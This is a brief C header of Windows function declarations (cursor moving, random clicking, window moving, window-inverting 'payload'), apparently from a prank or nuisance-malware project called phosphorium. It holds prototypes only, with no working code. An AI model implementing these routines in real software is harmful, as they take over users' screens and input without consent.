#pragma once
#include "phosphorium.h"

VOID
GetRandPath(
	_In_ LPWSTR szRand,
	_In_ CONST INT nLength
);

BOOL
WINAPI
CursorMove(VOID);

BOOL
WINAPI
CursorClicker(VOID);

BOOL
WINAPI
WindowMove(VOID);

BOOL
CALLBACK
EnumChildWindowsProc(
	_In_ HWND hWindow,
	_In_ LPARAM longPtr
);

VOID
WINAPI
WindowInvertPayload(VOID);